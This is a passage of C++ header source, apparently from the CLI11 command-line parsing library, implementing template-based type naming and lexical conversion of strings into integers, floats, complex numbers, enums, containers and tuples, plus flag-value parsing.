        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::tuple_value && type_count_base<T>::value == 1,
            detail::enabler> = detail::dummy>
        inline std::string type_name() {
            return type_name<typename std::decay<typename std::tuple_element<0, T>::type>::type>();
        }

        /// Empty string if the index > tuple size
        template <typename T, std::size_t I>
        inline typename std::enable_if<I == type_count_base<T>::value, std::string>::type tuple_name() {
            return std::string{};
        }

        /// Recursively generate the tuple type name
        template <typename T, std::size_t I>
        inline typename std::enable_if<(I < type_count_base<T>::value), std::string>::type tuple_name() {
            auto str = std::string{ type_name<typename std::decay<typename std::tuple_element<I, T>::type>::type>() } + ',' +
                tuple_name<T, I + 1>();
            if (str.back() == ',')
                str.pop_back();
            return str;
        }

        /// Print type name for tuples with 2 or more elements
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::tuple_value && type_count_base<T>::value >= 2,
            detail::enabler>>
            inline std::string type_name() {
            auto tname = std::string(1, '[') + tuple_name<T, 0>();
            tname.push_back(']');
            return tname;
        }

        /// get the type name for a type that has a value_type member
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::container_value ||
            classify_object<T>::value == object_category::wrapper_value,
            detail::enabler>>
            inline std::string type_name() {
            return type_name<typename T::value_type>();
        }

        // Lexical cast

        /// Convert to an unsigned integral
        template <typename T, enable_if_t<std::is_unsigned<T>::value, detail::enabler> = detail::dummy>
        bool integral_conversion(const std::string& input, T& output) noexcept {
            if (input.empty() || input.front() == '-') {
                return false;
            }
            char* val{ nullptr };
            errno = 0;
            std::uint64_t output_ll = std::strtoull(input.c_str(), &val, 0);
            if (errno == ERANGE) {
                return false;
            }
            output = static_cast<T>(output_ll);
            if (val == (input.c_str() + input.size()) && static_cast<std::uint64_t>(output) == output_ll) {
                return true;
            }
            val = nullptr;
            std::int64_t output_sll = std::strtoll(input.c_str(), &val, 0);
            if (val == (input.c_str() + input.size())) {
                output = (output_sll < 0) ? static_cast<T>(0) : static_cast<T>(output_sll);
                return (static_cast<std::int64_t>(output) == output_sll);
            }
            // remove separators
            if (input.find_first_of("_'") != std::string::npos) {
                std::string nstring = input;
                nstring.erase(std::remove(nstring.begin(), nstring.end(), '_'), nstring.end());
                nstring.erase(std::remove(nstring.begin(), nstring.end(), '\''), nstring.end());
                return integral_conversion(nstring, output);
            }
            if (std::isspace(static_cast<unsigned char>(input.back()))) {
                return integral_conversion(trim_copy(input), output);
            }
            if (input.compare(0, 2, "0o") == 0 || input.compare(0, 2, "0O") == 0) {
                val = nullptr;
                errno = 0;
                output_ll = std::strtoull(input.c_str() + 2, &val, 8);
                if (errno == ERANGE) {
                    return false;
                }
                output = static_cast<T>(output_ll);
                return (val == (input.c_str() + input.size()) && static_cast<std::uint64_t>(output) == output_ll);
            }
            if (input.compare(0, 2, "0b") == 0 || input.compare(0, 2, "0B") == 0) {
                // LCOV_EXCL_START
                // In some new compilers including the coverage testing one binary strings are handled properly in strtoull
                // automatically so this coverage is missing but is well tested in other compilers
                val = nullptr;
                errno = 0;
                output_ll = std::strtoull(input.c_str() + 2, &val, 2);
                if (errno == ERANGE) {
                    return false;
                }
                output = static_cast<T>(output_ll);
                return (val == (input.c_str() + input.size()) && static_cast<std::uint64_t>(output) == output_ll);
                // LCOV_EXCL_STOP
            }
            return false;
        }

        /// Convert to a signed integral
        template <typename T, enable_if_t<std::is_signed<T>::value, detail::enabler> = detail::dummy>
        bool integral_conversion(const std::string& input, T& output) noexcept {
            if (input.empty()) {
                return false;
            }
            char* val = nullptr;
            errno = 0;
            std::int64_t output_ll = std::strtoll(input.c_str(), &val, 0);
            if (errno == ERANGE) {
                return false;
            }
            output = static_cast<T>(output_ll);
            if (val == (input.c_str() + input.size()) && static_cast<std::int64_t>(output) == output_ll) {
                return true;
            }
            if (input == "true") {
                // this is to deal with a few oddities with flags and wrapper int types
                output = static_cast<T>(1);
                return true;
            }
            // remove separators and trailing spaces
            if (input.find_first_of("_'") != std::string::npos) {
                std::string nstring = input;
                nstring.erase(std::remove(nstring.begin(), nstring.end(), '_'), nstring.end());
                nstring.erase(std::remove(nstring.begin(), nstring.end(), '\''), nstring.end());
                return integral_conversion(nstring, output);
            }
            if (std::isspace(static_cast<unsigned char>(input.back()))) {
                return integral_conversion(trim_copy(input), output);
            }
            if (input.compare(0, 2, "0o") == 0 || input.compare(0, 2, "0O") == 0) {
                val = nullptr;
                errno = 0;
                output_ll = std::strtoll(input.c_str() + 2, &val, 8);
                if (errno == ERANGE) {
                    return false;
                }
                output = static_cast<T>(output_ll);
                return (val == (input.c_str() + input.size()) && static_cast<std::int64_t>(output) == output_ll);
            }
            if (input.compare(0, 2, "0b") == 0 || input.compare(0, 2, "0B") == 0) {
                // LCOV_EXCL_START
                // In some new compilers including the coverage testing one binary strings are handled properly in strtoll
                // automatically so this coverage is missing but is well tested in other compilers
                val = nullptr;
                errno = 0;
                output_ll = std::strtoll(input.c_str() + 2, &val, 2);
                if (errno == ERANGE) {
                    return false;
                }
                output = static_cast<T>(output_ll);
                return (val == (input.c_str() + input.size()) && static_cast<std::int64_t>(output) == output_ll);
                // LCOV_EXCL_STOP
            }
            return false;
        }

        /// Convert a flag into an integer value  typically binary flags sets errno to nonzero if conversion failed
        inline std::int64_t to_flag_value(std::string val) noexcept {
            static const std::string trueString("true");
            static const std::string falseString("false");
            if (val == trueString) {
                return 1;
            }
            if (val == falseString) {
                return -1;
            }
            val = detail::to_lower(val);
            std::int64_t ret = 0;
            if (val.size() == 1) {
                if (val[0] >= '1' && val[0] <= '9') {
                    return (static_cast<std::int64_t>(val[0]) - '0');
                }
                switch (val[0]) {
                case '0':
                case 'f':
                case 'n':
                case '-':
                    ret = -1;
                    break;
                case 't':
                case 'y':
                case '+':
                    ret = 1;
                    break;
                default:
                    errno = EINVAL;
                    return -1;
                }
                return ret;
            }
            if (val == trueString || val == "on" || val == "yes" || val == "enable") {
                ret = 1;
            }
            else if (val == falseString || val == "off" || val == "no" || val == "disable") {
                ret = -1;
            }
            else {
                char* loc_ptr{ nullptr };
                ret = std::strtoll(val.c_str(), &loc_ptr, 0);
                if (loc_ptr != (val.c_str() + val.size()) && errno == 0) {
                    errno = EINVAL;
                }
            }
            return ret;
        }

        /// Integer conversion
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::integral_value ||
            classify_object<T>::value == object_category::unsigned_integral,
            detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string & input, T & output) {
            return integral_conversion(input, output);
        }

        /// char values
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::char_value, detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string& input, T& output) {
            if (input.size() == 1) {
                output = static_cast<T>(input[0]);
                return true;
            }
            return integral_conversion(input, output);
        }

        /// Boolean values
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::boolean_value, detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string& input, T& output) {
            errno = 0;
            auto out = to_flag_value(input);
            if (errno == 0) {
                output = (out > 0);
            }
            else if (errno == ERANGE) {
                output = (input[0] != '-');
            }
            else {
                return false;
            }
            return true;
        }

        /// Floats
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::floating_point, detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string& input, T& output) {
            if (input.empty()) {
                return false;
            }
            char* val = nullptr;
            auto output_ld = std::strtold(input.c_str(), &val);
            output = static_cast<T>(output_ld);
            if (val == (input.c_str() + input.size())) {
                return true;
            }
            while (std::isspace(static_cast<unsigned char>(*val))) {
                ++val;
                if (val == (input.c_str() + input.size())) {
                    return true;
                }
            }

            // remove separators
            if (input.find_first_of("_'") != std::string::npos) {
                std::string nstring = input;
                nstring.erase(std::remove(nstring.begin(), nstring.end(), '_'), nstring.end());
                nstring.erase(std::remove(nstring.begin(), nstring.end(), '\''), nstring.end());
                return lexical_cast(nstring, output);
            }
            return false;
        }

        /// complex
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::complex_number, detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string& input, T& output) {
            using XC = typename wrapped_type<T, double>::type;
            XC x{ 0.0 }, y{ 0.0 };
            auto str1 = input;
            bool worked = false;
            auto nloc = str1.find_last_of("+-");
            if (nloc != std::string::npos && nloc > 0) {
                worked = lexical_cast(str1.substr(0, nloc), x);
                str1 = str1.substr(nloc);
                if (str1.back() == 'i' || str1.back() == 'j')
                    str1.pop_back();
                worked = worked && lexical_cast(str1, y);
            }
            else {
                if (str1.back() == 'i' || str1.back() == 'j') {
                    str1.pop_back();
                    worked = lexical_cast(str1, y);
                    x = XC{ 0 };
                }
                else {
                    worked = lexical_cast(str1, x);
                    y = XC{ 0 };
                }
            }
            if (worked) {
                output = T{ x, y };
                return worked;
            }
            return from_stream(input, output);
        }

        /// String and similar direct assignment
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::string_assignable, detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string& input, T& output) {
            output = input;
            return true;
        }

        /// String and similar constructible and copy assignment
        template <
            typename T,
            enable_if_t<classify_object<T>::value == object_category::string_constructible, detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string& input, T& output) {
            output = T(input);
            return true;
        }

        /// Wide strings
        template <
            typename T,
            enable_if_t<classify_object<T>::value == object_category::wstring_assignable, detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string& input, T& output) {
            output = widen(input);
            return true;
        }

        template <
            typename T,
            enable_if_t<classify_object<T>::value == object_category::wstring_constructible, detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string& input, T& output) {
            output = T{ widen(input) };
            return true;
        }

        /// Enumerations
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::enumeration, detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string& input, T& output) {
            typename std::underlying_type<T>::type val;
            if (!integral_conversion(input, val)) {
                return false;
            }
            output = static_cast<T>(val);
            return true;
        }

        /// wrapper types
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::wrapper_value &&
            std::is_assignable<T&, typename T::value_type>::value,
            detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string & input, T & output) {
            typename T::value_type val;
            if (lexical_cast(input, val)) {
                output = val;
                return true;
            }
            return from_stream(input, output);
        }

        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::wrapper_value &&
            !std::is_assignable<T&, typename T::value_type>::value&& std::is_assignable<T&, T>::value,
            detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string & input, T & output) {
            typename T::value_type val;
            if (lexical_cast(input, val)) {
                output = T{ val };
                return true;
            }
            return from_stream(input, output);
        }

        /// Assignable from double or int
        template <
            typename T,
            enable_if_t<classify_object<T>::value == object_category::number_constructible, detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string& input, T& output) {
            int val = 0;
            if (integral_conversion(input, val)) {
                output = T(val);
                return true;
            }

            double dval = 0.0;
            if (lexical_cast(input, dval)) {
                output = T{ dval };
                return true;
            }

            return from_stream(input, output);
        }

        /// Assignable from int
        template <
            typename T,
            enable_if_t<classify_object<T>::value == object_category::integer_constructible, detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string& input, T& output) {
            int val = 0;
            if (integral_conversion(input, val)) {
                output = T(val);
                return true;
            }
            return from_stream(input, output);
        }

        /// Assignable from double
        template <
            typename T,
            enable_if_t<classify_object<T>::value == object_category::double_constructible, detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string& input, T& output) {
            double val = 0.0;
            if (lexical_cast(input, val)) {
                output = T{ val };
                return true;
            }
            return from_stream(input, output);
        }

        /// Non-string convertible from an int
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::other && std::is_assignable<T&, int>::value,
            detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string & input, T & output) {
            int val = 0;
            if (integral_conversion(input, val)) {
#ifdef _MSC_VER
#pragma warning(push)
#pragma warning(disable : 4800)
#endif
                // with Atomic<XX> this could produce a warning due to the conversion but if atomic gets here it is an old style
                // so will most likely still work
                output = val;
#ifdef _MSC_VER
#pragma warning(pop)
#endif
                return true;
            }
            // LCOV_EXCL_START
            // This version of cast is only used for odd cases in an older compilers the fail over
            // from_stream is tested elsewhere an not relevant for coverage here
            return from_stream(input, output);
            // LCOV_EXCL_STOP
        }

        /// Non-string parsable by a stream
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::other && !std::is_assignable<T&, int>::value&&
            is_istreamable<T>::value,
            detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string & input, T & output) {
            return from_stream(input, output);
        }

        /// Fallback overload that prints a human-readable error for types that we don't recognize and that don't have a
        /// user-supplied lexical_cast overload.
        template <typename T,
            enable_if_t<classify_object<T>::value == object_category::other && !std::is_assignable<T&, int>::value &&
            !is_istreamable<T>::value && !adl_detail::is_lexical_castable<T>::value,
            detail::enabler> = detail::dummy>
        bool lexical_cast(const std::string& /*input*/, T& /*output*/) {
            static_assert(!std::is_same<T, T>::value,  // Can't just write false here.
                "option object type must have a lexical cast overload or streaming input operator(>>) defined, if it "
                "is convertible from another type use the add_option<T, XC>(...) with XC being the known type");
            return false;
        }

        /// Assign a value through lexical cast operations
        /// Strings can be empty so we need to do a little different
        template <typename AssignTo,
            typename ConvertTo,
            enable_if_t<std::is_same<AssignTo, ConvertTo>::value &&
            (classify_object<AssignTo>::value == object_category::string_assignable ||
                classify_object<AssignTo>::value == object_category::string_constructible ||
                classify_object<AssignTo>::value == object_category::wstring_assignable ||
                classify_object<AssignTo>::value == object_category::wstring_constructible),
            detail::enabler> = detail::dummy>
        bool lexical_assign(const std::string& input, AssignTo& output) {
            return lexical_cast(input, output);
        }

        /// Assign a value through lexical cast operations
        template <typename AssignTo,
            typename ConvertTo,
            enable_if_t<std::is_same<AssignTo, ConvertTo>::value&& std::is_assignable<AssignTo&, AssignTo>::value&&
            classify_object<AssignTo>::value != object_category::string_assignable &&
            classify_object<AssignTo>::value != object_category::string_constructible &&
            classify_object<AssignTo>::value != object_category::wstring_assignable &&
            classify_object<AssignTo>::value != object_category::wstring_constructible,
            detail::enabler> = detail::dummy>
        bool lexical_assign(const std::string & input, AssignTo & output) {
            if (input.empty()) {
                output = AssignTo{};
                return true;
            }

            return lexical_cast(input, output);
        }  // LCOV_EXCL_LINE

        /// Assign a value through lexical cast operations
        template <typename AssignTo,
            typename ConvertTo,
            enable_if_t<std::is_same<AssignTo, ConvertTo>::value && !std::is_assignable<AssignTo&, AssignTo>::value&&
            classify_object<AssignTo>::value == object_category::wrapper_value,
            detail::enabler> = detail::dummy>
        bool lexical_assign(const std::string& input, AssignTo& output) {
            if (input.empty()) {
                typename AssignTo::value_type emptyVal{};
                output = emptyVal;
                return true;
            }
            return lexical_cast(input, output);
        }

        /// Assign a value through lexical cast operations for int compatible values
        /// mainly for atomic operations on some compilers
        template <typename AssignTo,
            typename ConvertTo,
            enable_if_t<std::is_same<AssignTo, ConvertTo>::value && !std::is_assignable<AssignTo&, AssignTo>::value&&
            classify_object<AssignTo>::value != object_category::wrapper_value &&
            std::is_assignable<AssignTo&, int>::value,
            detail::enabler> = detail::dummy>
        bool lexical_assign(const std::string & input, AssignTo & output) {
            if (input.empty()) {
                output = 0;
                return true;
            }
            int val{ 0 };
            if (lexical_cast(input, val)) {
#if defined(__clang__)
                /* on some older clang compilers */
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wsign-conversion"
#endif
                output = val;
#if defined(__clang__)
#pragma clang diagnostic pop
#endif
                return true;
            }
            return false;
        }

        /// Assign a value converted from a string in lexical cast to the output value directly
        template <typename AssignTo,
            typename ConvertTo,
            enable_if_t<!std::is_same<AssignTo, ConvertTo>::value&& std::is_assignable<AssignTo&, ConvertTo&>::value,
            detail::enabler> = detail::dummy>
        bool lexical_assign(const std::string& input, AssignTo& output) {
            ConvertTo val{};
            bool parse_result = (!input.empty()) ? lexical_cast(input, val) : true;
            if (parse_result) {
                output = val;
            }
            return parse_result;
        }

        /// Assign a value from a lexical cast through constructing a value and move assigning it
        template <
            typename AssignTo,
            typename ConvertTo,
            enable_if_t<!std::is_same<AssignTo, ConvertTo>::value && !std::is_assignable<AssignTo&, ConvertTo&>::value&&
            std::is_move_assignable<AssignTo>::value,
            detail::enabler> = detail::dummy>
        bool lexical_assign(const std::string& input, AssignTo& output) {
            ConvertTo val{};
            bool parse_result = input.empty() ? true : lexical_cast(input, val);
            if (parse_result) {
                output = AssignTo(val);  // use () form of constructor to allow some implicit conversions
            }
            return parse_result;
        }

        /// primary lexical conversion operation, 1 string to 1 type of some kind
        template <typename AssignTo,
            typename ConvertTo,
            enable_if_t<classify_object<ConvertTo>::value <= object_category::other &&
            classify_object<AssignTo>::value <= object_category::wrapper_value,
            detail::enabler> = detail::dummy>
        bool lexical_conversion(const std::vector<std::string> &strings, AssignTo & output) {
            return lexical_assign<AssignTo, ConvertTo>(strings[0], output);
        }

        /// Lexical conversion if there is only one element but the conversion type is for two, then call a two element
        /// constructor
        template <typename AssignTo,
            typename ConvertTo,
            enable_if_t<(type_count<AssignTo>::value <= 2) && expected_count<AssignTo>::value == 1 &&
            is_tuple_like<ConvertTo>::value&& type_count_base<ConvertTo>::value == 2,
            detail::enabler> = detail::dummy>
        bool lexical_conversion(const std::vector<std::string> &strings, AssignTo & output) {
            // the remove const is to handle pair types coming from a container
            using FirstType = typename std::remove_const<typename std::tuple_element<0, ConvertTo>::type>::type;
            using SecondType = typename std::tuple_element<1, ConvertTo>::type;
            FirstType v1;
            SecondType v2;
            bool retval = lexical_assign<FirstType, FirstType>(strings[0], v1);
            retval = retval && lexical_assign<SecondType, SecondType>((strings.size() > 1) ? strings[1] : std::string{}, v2);
            if (retval) {
                output = AssignTo{ v1, v2 };
            }
            return retval;
        }

        /// Lexical conversion of a container types of single elements
        template <class AssignTo,
            class ConvertTo,
            enable_if_t<is_mutable_container<AssignTo>::value&& is_mutable_container<ConvertTo>::value&&
            type_count<ConvertTo>::value == 1,
            detail::enabler> = detail::dummy>
        bool lexical_conversion(const std::vector<std::string>& strings, AssignTo& output) {
            output.erase(output.begin(), output.end());
            if (strings.empty()) {
                return true;
            }
            if (strings.size() == 1 && strings[0] == "{}") {
                return true;
            }
            bool skip_remaining = false;
            if (strings.size() == 2 && strings[0] == "{}" && is_separator(strings[1])) {
                skip_remaining = true;
            }
            for (const auto& elem : strings) {
                typename AssignTo::value_type out;
                bool retval = lexical_assign<typename AssignTo::value_type, typename ConvertTo::value_type>(elem, out);
                if (!retval) {
                    return false;
                }
                output.insert(output.end(), std::move(out));
                if (skip_remaining) {
                    break;
                }
            }
            return (!output.empty());
        }

        /// Lexical conversion for complex types
        template <class AssignTo, class ConvertTo, enable_if_t<is_complex<ConvertTo>::value, detail::enabler> = detail::dummy>
        bool lexical_conversion(const std::vector<std::string>& strings, AssignTo& output) {

            if (strings.size() >= 2 && !strings[1].empty()) {
                using XC2 = typename wrapped_type<ConvertTo, double>::type;
                XC2 x{ 0.0 }, y{ 0.0 };
                auto str1 = strings[1];
                if (str1.back() == 'i' || str1.back() == 'j') {
                    str1.pop_back();
                }
                auto worked = lexical_cast(strings[0], x) && lexical_cast(str1, y);
                if (worked) {
                    output = ConvertTo{ x, y };
                }
                return worked;
            }
            return lexical_assign<AssignTo, ConvertTo>(strings[0], output);
        }

        /// Conversion to a vector type using a particular single type as the conversion type
        template <class AssignTo,
            class ConvertTo,
            enable_if_t<is_mutable_container<AssignTo>::value && (expected_count<ConvertTo>::value == 1) &&
            (type_count<ConvertTo>::value == 1),
            detail::enabler> = detail::dummy>
        bool lexical_conversion(const std::vector<std::string>& strings, AssignTo& output) {
            bool retval = true;
            output.clear();
            output.reserve(strings.size());
            for (const auto& elem : strings) {

                output.emplace_back();
                retval = retval && lexical_assign<typename AssignTo::value_type, ConvertTo>(elem, output.back());
            }
            return (!output.empty()) && retval;
        }

        // forward declaration

        /// Lexical conversion of a container types with conversion type of two elements
        template <class AssignTo,
            class ConvertTo,
            enable_if_t<is_mutable_container<AssignTo>::value&& is_mutable_container<ConvertTo>::value&&
            type_count_base<ConvertTo>::value == 2,
            detail::enabler> = detail::dummy>
        bool lexical_conversion(std::vector<std::string> strings, AssignTo& output);

        /// Lexical conversion of a vector types with type_size >2 forward declaration
        template <class AssignTo,
            class ConvertTo,
            enable_if_t<is_mutable_container<AssignTo>::value&& is_mutable_container<ConvertTo>::value&&
            type_count_base<ConvertTo>::value != 2 &&
            ((type_count<ConvertTo>::value > 2) ||
                (type_count<ConvertTo>::value > type_count_base<ConvertTo>::value)),
            detail::enabler> = detail::dummy>
        bool lexical_conversion(const std::vector<std::string>& strings, AssignTo& output);

        /// Conversion for tuples
        template <class AssignTo,
            class ConvertTo,
            enable_if_t<is_tuple_like<AssignTo>::value&& is_tuple_like<ConvertTo>::value &&
            (type_count_base<ConvertTo>::value != type_count<ConvertTo>::value ||
                type_count<ConvertTo>::value > 2),
            detail::enabler> = detail::dummy>
            bool lexical_conversion(const std::vector<std::string>& strings, AssignTo& output);  // forward declaration

        /// Conversion for operations where the assigned type is some class but the conversion is a mutable container or large
        /// tuple
        template <typename AssignTo,
            typename ConvertTo,
            enable_if_t<!is_tuple_like<AssignTo>::value && !is_mutable_container<AssignTo>::value&&
            classify_object<ConvertTo>::value != object_category::wrapper_value &&
            (is_mutable_container<ConvertTo>::value || type_count<ConvertTo>::value > 2),
            detail::enabler> = detail::dummy>
            bool lexical_conversion(const std::vector<std::string>& strings, AssignTo& output) {

            if (strings.size() > 1 || (!strings.empty() && !(strings.front().empty()))) {
                ConvertTo val;
                auto retval = lexical_conversion<ConvertTo, ConvertTo>(strings, val);
                output = AssignTo{ val };
                return retval;
            }
            output = AssignTo{};
            return true;
        }

        /// function template for converting tuples if the static Index is greater than the tuple size
        template <class AssignTo, class ConvertTo, std::size_t I>
        inline typename std::enable_if<(I >= type_count_base<AssignTo>::value), bool>::type
            tuple_conversion(const std::vector<std::string>&, AssignTo&) {
            return true;
        }

        /// Conversion of a tuple element where the type size ==1 and not a mutable container
        template <class AssignTo, class ConvertTo>
        inline typename std::enable_if<!is_mutable_container<ConvertTo>::value&& type_count<ConvertTo>::value == 1, bool>::type
            tuple_type_conversion(std::vector<std::string>& strings, AssignTo& output) {
            auto retval = lexical_assign<AssignTo, ConvertTo>(strings[0], output);
            strings.erase(strings.begin());
            return retval;
        }

        /// Conversion of a tuple element where the type size !=1 but the size is fixed and not a mutable container
        template <class AssignTo, class ConvertTo>
        inline typename std::enable_if<!is_mutable_container<ConvertTo>::value && (type_count<ConvertTo>::value > 1) &&
            type_count<ConvertTo>::value == type_count_min<ConvertTo>::value,
            bool>::type
            tuple_type_conversion(std::vector<std::string>& strings, AssignTo& output) {
            auto retval = lexical_conversion<AssignTo, ConvertTo>(strings, output);
            strings.erase(strings.begin(), strings.begin() + type_count<ConvertTo>::value);
            return retval;
        }

        /// Conversion of a tuple element where the type is a mutable container or a type with different min and max type sizes
        template <class AssignTo, class ConvertTo>
        inline typename std::enable_if<is_mutable_container<ConvertTo>::value ||
            type_count<ConvertTo>::value != type_count_min<ConvertTo>::value,
            bool>::type
            tuple_type_conversion(std::vector<std::string>& strings, AssignTo& output) {

            std::size_t index{ subtype_count_min<ConvertTo>::value };
            const std::size_t mx_count{ subtype_count<ConvertTo>::value };
            const std::size_t mx{ (std::min)(mx_count, strings.size() - 1) };

            while (index < mx) {
                if (is_separator(strings[index])) {
                    break;
                }
                ++index;
            }
            bool retval = lexical_conversion<AssignTo, ConvertTo>(
                std::vector<std::string>(strings.begin(), strings.begin() + static_cast<std::ptrdiff_t>(index)), output);
            if (strings.size() > index) {
                strings.erase(strings.begin(), strings.begin() + static_cast<std::ptrdiff_t>(index) + 1);
            }
            else {
                strings.clear();
            }
            return retval;
        }

        /// Tuple conversion operation
        template <class AssignTo, class ConvertTo, std::size_t I>
        inline typename std::enable_if<(I < type_count_base<AssignTo>::value), bool>::type
            tuple_conversion(std::vector<std::string> strings, AssignTo& output) {
            bool retval = true;
            using ConvertToElement = typename std::
                conditional<is_tuple_like<ConvertTo>::value, typename std::tuple_element<I, ConvertTo>::type, ConvertTo>::type;
            if (!strings.empty()) {
                retval = retval && tuple_type_conversion<typename std::tuple_element<I, AssignTo>::type, ConvertToElement>(
                    strings, std::get<I>(output));
            }
            retval = retval && tuple_conversion<AssignTo, ConvertTo, I + 1>(std::move(strings), output);
            return retval;
        }

        /// Lexical conversion of a container types with tuple elements of size 2
        template <class AssignTo,
            class ConvertTo,
            enable_if_t<is_mutable_container<AssignTo>::value&& is_mutable_container<ConvertTo>::value&&
            type_count_base<ConvertTo>::value == 2,
            detail::enabler>>
            bool lexical_conversion(std::vector<std::string> strings, AssignTo& output) {
            output.clear();
            while (!strings.empty()) {

                typename std::remove_const<typename std::tuple_element<0, typename ConvertTo::value_type>::type>::type v1;
                typename std::tuple_element<1, typename ConvertTo::value_type>::type v2;
                bool retval = tuple_type_conversion<decltype(v1), decltype(v1)>(strings, v1);
                if (!strings.empty()) {
                    retval = retval && tuple_type_conversion<decltype(v2), decltype(v2)>(strings, v2);
                }
                if (retval) {
                    output.insert(output.end(), typename AssignTo::value_type{ v1, v2 });
                }
                else {
                    return false;
                }
            }
            return (!output.empty());
        }

        /// lexical conversion of tuples with type count>2 or tuples of types of some element with a type size>=2
        template <class AssignTo,
            class ConvertTo,
            enable_if_t<is_tuple_like<AssignTo>::value&& is_tuple_like<ConvertTo>::value &&
            (type_count_base<ConvertTo>::value != type_count<ConvertTo>::value ||
                type_count<ConvertTo>::value > 2),
            detail::enabler>>
            bool lexical_conversion(const std::vector<std::string>& strings, AssignTo& output) {
            static_assert(
                !is_tuple_like<ConvertTo>::value || type_count_base<AssignTo>::value == type_count_base<ConvertTo>::value,
                "if the conversion type is defined as a tuple it must be the same size as the type you are converting to");
            return tuple_conversion<AssignTo, ConvertTo, 0>(strings, output);
        }

        /// Lexical conversion of a vector types for everything but tuples of two elements and types of size 1
        template <class AssignTo,
            class ConvertTo,
            enable_if_t<is_mutable_container<AssignTo>::value&& is_mutable_container<ConvertTo>::value&&
            type_count_base<ConvertTo>::value != 2 &&
            ((type_count<ConvertTo>::value > 2) ||
                (type_count<ConvertTo>::value > type_count_base<ConvertTo>::value)),
            detail::enabler>>
            bool lexical_conversion(const std::vector<std::string>& strings, AssignTo& output) {
            bool retval = true;
            output.clear();
            std::vector<std::string> temp;
            std::size_t ii{ 0 };
            std::size_t icount{ 0 };
            std::size_t xcm{ type_count<ConvertTo>::value };
            auto ii_max = strings.size();
            while (ii < ii_max) {
                temp.push_back(strings[ii]);
                ++ii;
                ++icount;
                if (icount == xcm || is_separator(temp.back()) || ii == ii_max) {
                    if (static_cast<int>(xcm) > type_count_min<ConvertTo>::value && is_separator(temp.back())) {
                        temp.pop_back();
                    }
                    typename AssignTo::value_type temp_out;
                    retval = retval &&
                        lexical_conversion<typename AssignTo::value_type, typename ConvertTo::value_type>(temp, temp_out);
                    temp.clear();
                    if (!retval) {
                        return false;
                    }
                    output.insert(output.end(), std::move(temp_out));
                    icount = 0;
                }
            }
            return retval;
        }

        /// conversion for wrapper types
        template <typename AssignTo,
            class ConvertTo,
            enable_if_t<classify_object<ConvertTo>::value == object_category::wrapper_value &&
            std::is_assignable<ConvertTo&, ConvertTo>::value,
            detail::enabler> = detail::dummy>
        bool lexical_conversion(const std::vector<std::string> &strings, AssignTo & output) {
            if (strings.empty() || strings.front().empty()) {
                output = ConvertTo{};
                return true;
            }
            typename ConvertTo::value_type val;
            if (lexical_conversion<typename ConvertTo::value_type, typename ConvertTo::value_type>(strings, val)) {
                output = ConvertTo{ val };
                return true;
            }
            return false;
        }

        /// conversion for wrapper types
        template <typename AssignTo,
            class ConvertTo,
            enable_if_t<classify_object<ConvertTo>::value == object_category::wrapper_value &&
            !std::is_assignable<AssignTo&, ConvertTo>::value,
            detail::enabler> = detail::dummy>
        bool lexical_conversion(const std::vector<std::string> &strings, AssignTo & output) {
            using ConvertType = typename ConvertTo::value_type;
            if (strings.empty() || strings.front().empty()) {
                output = ConvertType{};
                return true;
            }
            ConvertType val;
            if (lexical_conversion<typename ConvertTo::value_type, typename ConvertTo::value_type>(strings, val)) {
                output = val;
                return true;
            }
            return false;
        }

        /// Sum a vector of strings
        inline std::string sum_string_vector(const std::vector<std::string>& values) {
            double val{ 0.0 };
            bool fail{ false };
            std::string output;
            for (const auto& arg : values) {
                double tv{ 0.0 };
                auto comp = lexical_cast(arg, tv);
                if (!comp) {
                    errno = 0;
                    auto fv = detail::to_flag_value(arg);
                    fail = (errno != 0);
                    if (fail) {
                        break;
                    }
                    tv = static_cast<double>(fv);
                }
                val += tv;
            }
            if (fail) {
                for (const auto& arg : values) {
                    output.append(arg);
                }
            }
            else {
                std::ostringstream out;
                out.precision(16);
                out << val;
                output = out.str();
            }
            return output;
        }

    }  // namespace detail



    namespace detail {

        // Returns false if not a short option. Otherwise, sets opt name and rest and returns true
        CLI11_INLINE bool split_short(const std::string& current, std::string& name, std::string& rest);

        // Returns false if not a long option. Otherwise, sets opt name and other side of = and returns true
        CLI11_INLINE bool split_long(const std::string& current, std::string& name, std::string& value);

        // Returns false if not a windows style option. Otherwise, sets opt name and value and returns true
        CLI11_INLINE bool split_windows_style(const std::string& current, std::string& name, std::string& value);

        // Splits a string into multiple long and short names
        CLI11_INLINE std::vector<std::string> split_names(std::string current);

        /// extract default flag values either {def} or starting with a !
        CLI11_INLINE std::vector<std::pair<std::string, std::string>> get_default_flag_values(const std::string& str);

        /// Get a vector of short names, one of long names, and a single name
        CLI11_INLINE std::tuple<std::vector<std::string>, std::vector<std::string>, std::string>
            get_names(const std::vector<std::string>& input, bool allow_non_standard = false);

    }  // namespace detail



    namespace detail {

        CLI11_INLINE bool split_short(const std::string& current, std::string& name, std::string& rest) {
